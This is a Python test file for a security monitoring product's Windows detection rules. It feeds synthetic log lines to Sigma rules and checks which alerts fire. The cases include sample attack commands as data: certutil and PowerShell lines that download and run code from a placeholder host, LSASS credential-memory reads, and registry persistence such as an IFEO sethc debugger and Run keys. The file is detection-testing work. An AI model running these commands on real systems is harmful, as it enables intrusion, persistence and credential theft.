# tests/worker/test_windows_ioa.py
"""Behaviour (IOA) rules on the agent's process access, remote thread and
registry persistence lines (agent/internal/winsensor: access.go,
registry.go): each fires on the attack and stays quiet on the look-alike
normal activity, and the lines reach Sigma's process_access /
create_remote_thread / registry_* categories."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest

from worker.decoder_engine import DecoderEngine
from worker.sigma_engine import SigmaEngine

ROOT = os.path.join(os.path.dirname(__file__), "../..")
USERS = "C:\\Users\\alice"
SYS = "C:\\Windows\\System32"
OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16"


def _load(pattern):
    return [open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, pattern)))]


@pytest.fixture(scope="module")
def decoders():
    import yaml
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(_load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    return dec


@pytest.fixture(scope="module")
def rules():
    sig = SigmaEngine()
    sig.load_from_yaml_list(_load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return sig


def q(v):  # winevent.Quote: backslashes are not escaped
    return '"' + v + '"'


def access_line(src, target, granted):
    # As accessTracker.openProcess formats it (TestLsassMemoryReadIsReported).
    return (f'EventID=10 Channel="ETW" Provider="Microsoft-Windows-Kernel-Audit-API-Calls" SourceProcessId="6788" '
            f'SourceImage={q(src)} SourceUser="WIN01\\alice" TargetProcessId="700" TargetImage={q(target)} '
            f'GrantedAccess="{granted}"')


def thread_line(src, target):
    return (f'EventID=8 Channel="ETW" Provider="Microsoft-Windows-Kernel-Process" SourceProcessId="6788" '
            f'SourceImage={q(src)} SourceUser="WIN01\\alice" TargetProcessId="4100" TargetImage={q(target)} '
            f'StartAddress="0x7ff6a1b20000" NewThreadId="9100"')


def reg_line(target, details=None, event_type="SetValue"):
    eid = 13 if event_type == "SetValue" else 12
    out = f'EventID={eid} Channel="ETW" Provider="SIEMAgent-Registry" EventType="{event_type}" TargetObject={q(target)}'
    return out + (f' Details={q(details)}' if details is not None else "")


def proc_line(image, cmd, parent="C:\\Windows\\explorer.exe"):
    return (f'EventID=1 Channel="ETW" Provider="Microsoft-Windows-Kernel-Process" ProcessId="4321" '
            f'Image={q(image)} CommandLine={q(cmd)} User="WIN01\\alice" IntegrityLevel="Medium" '
            f'ParentProcessId="1000" ParentImage={q(parent)}')


RUN = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
HKLM_RUN = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"
SVC = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\"
WINLOGON = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
IFEO = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

CASES = [
    # (log_type, line, titles that must fire (empty: none of this file's rules))
    ("windows_etw_access", access_line(f"{USERS}\\Downloads\\mimi.exe", f"{SYS}\\lsass.exe", "0x1010"),
     {"LSASS Memory Read By Untrusted Program"}),
    ("windows_etw_access", access_line(f"{SYS}\\rundll32.exe", f"{SYS}\\lsass.exe", "0x1FFFFF"),
     {"LSASS Memory Read By Untrusted Program"}),
    ("windows_etw_access", access_line(f"{SYS}\\svchost.exe", f"{SYS}\\lsass.exe", "0x1410"), set()),
    ("windows_etw_access", access_line("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
                                       f"{SYS}\\lsass.exe", "0x1010"), set()),
    ("windows_etw_access", access_line(f"{USERS}\\AppData\\Local\\Temp\\ldr.exe", "C:\\Windows\\explorer.exe",
                                       "0x1F0FFF"),
     {"Process Injection Rights Into A System Process From A User Folder"}),
    ("windows_etw_access", access_line("C:\\Program Files\\Vendor\\agent.exe", "C:\\Windows\\explorer.exe", "0x1F0FFF"),
     set()),
    ("windows_etw_access", thread_line(f"{USERS}\\AppData\\Roaming\\x.exe", "C:\\Windows\\explorer.exe"),
     {"Remote Thread Created By Untrusted Program"}),
    ("windows_etw_access", thread_line(f"{SYS}\\csrss.exe", "C:\\Windows\\explorer.exe"), set()),
    ("windows_etw_access", thread_line("", "C:\\Windows\\explorer.exe"), set()),  # writer unknown
    ("windows_etw_registry", reg_line(RUN + "Updater", "powershell -w hidden -enc SQBFAFgA"),
     {"Run Key Points To A Script Or User Folder", "Run Key Value Set"}),
    ("windows_etw_registry", reg_line(HKLM_RUN + "SecurityHealth", "%windir%\\system32\\SecurityHealthSystray.exe"),
     {"Run Key Value Set"}),
    ("windows_etw_registry", reg_line(RUN + "Gone", event_type="DeleteValue"), set()),
    ("windows_etw_registry", reg_line(SVC + "EvilSvc\\ImagePath", "C:\\Users\\Public\\svc.exe"),
     {"Service Points To A Script Or User Folder"}),
    ("windows_etw_registry", reg_line(SVC + "Spooler\\ImagePath", "%SystemRoot%\\System32\\spoolsv.exe"), set()),
    ("windows_etw_registry", reg_line(WINLOGON + "Shell", "explorer.exe, C:\\Users\\Public\\x.exe"),
     {"Winlogon Shell Or Userinit Changed"}),
    ("windows_etw_registry", reg_line(WINLOGON + "Shell", "explorer.exe"), set()),
    ("windows_etw_registry", reg_line(IFEO + "sethc.exe\\Debugger", "C:\\Windows\\System32\\cmd.exe"),
     {"Image File Execution Options Debugger Or Silent Exit Monitor Set"}),
    ("windows_etw_registry", reg_line(IFEO + "sethc.exe\\GlobalFlag", "DWORD (0x00000200)"), set()),
    ("windows_etw_registry", reg_line("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
                                      "C:\\ProgramData\\hook.dll"), {"AppInit DLLs Set"}),
    ("windows_etw_registry", reg_line("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
                                      ""), set()),
    ("windows_etw_registry", reg_line("HKU\\S-1-5-21-1\\Environment\\UserInitMprLogonScript", "C:\\x.bat"),
     {"User Logon Script Set"}),
    ("windows_etw_registry", reg_line(SVC + "EvilSvc", event_type="CreateKey"), set()),
    ("windows_etw_process", proc_line(f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell -nop -w hidden",
                                      f"{OFFICE}\\WINWORD.EXE"),
     {"Office Application Started A Shell Or Script Host"}),
    ("windows_etw_process", proc_line(f"{OFFICE}\\EXCEL.EXE", "excel.exe report.xlsx", f"{OFFICE}\\WINWORD.EXE"),
     set()),
    ("windows_etw_process", proc_line(f"{SYS}\\certutil.exe", "certutil -urlcache -split -f http://x/a.exe a.exe"),
     {"Built-in Windows Tool Used To Download A File"}),
    ("windows_etw_process", proc_line(f"{SYS}\\certutil.exe", "certutil -hashfile a.exe SHA256"), set()),
    ("windows_etw_process", proc_line(f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe",
                                      "powershell -c (New-Object Net.WebClient).DownloadString('http://x')|iex"),
     {"Built-in Windows Tool Used To Download A File"}),
]

OURS = {
    "LSASS Memory Read By Untrusted Program", "Process Injection Rights Into A System Process From A User Folder",
    "Remote Thread Created By Untrusted Program", "Run Key Points To A Script Or User Folder", "Run Key Value Set",
    "Image File Execution Options Debugger Or Silent Exit Monitor Set", "Winlogon Shell Or Userinit Changed",
    "Service Points To A Script Or User Folder", "AppInit DLLs Set", "User Logon Script Set",
    "Office Application Started A Shell Or Script Host", "Built-in Windows Tool Used To Download A File",
}


@pytest.mark.parametrize("log_type,line,want", CASES)
def test_ioa_rules(decoders, rules, log_type, line, want):
    event, name = decoders.decode_named(log_type, line)
    assert name, f"no decoder for {line}"
    flat = {**event, "log_type": log_type, "raw_message": line, "hostname": "WIN01", "group_id": "default"}
    titles = {m["title"] for m in asyncio.run(rules.evaluate(flat))}
    assert titles & OURS == want


def test_decoded_fields(decoders):
    event, name = decoders.decode_named("windows_etw_access", access_line(f"{USERS}\\m.exe", f"{SYS}\\lsass.exe", "0x1010"))
    assert name == "win_etw_process_access" and event["process.pid"] == "6788"
    assert event["process.target.executable"] == f"{SYS}\\lsass.exe" and event["event.action"] == "process_access"
    event, name = decoders.decode_named("windows_etw_access", thread_line(f"{USERS}\\x.exe", f"{SYS}\\notepad.exe"))
    assert name == "win_etw_remote_thread" and event["event.action"] == "create_remote_thread"
    event, name = decoders.decode_named("windows_etw_registry", reg_line(RUN + "U", "x.exe"))
    assert name == "win_etw_registry" and event["registry.path"] == RUN + "U" and event["registry.data.strings"] == "x.exe"
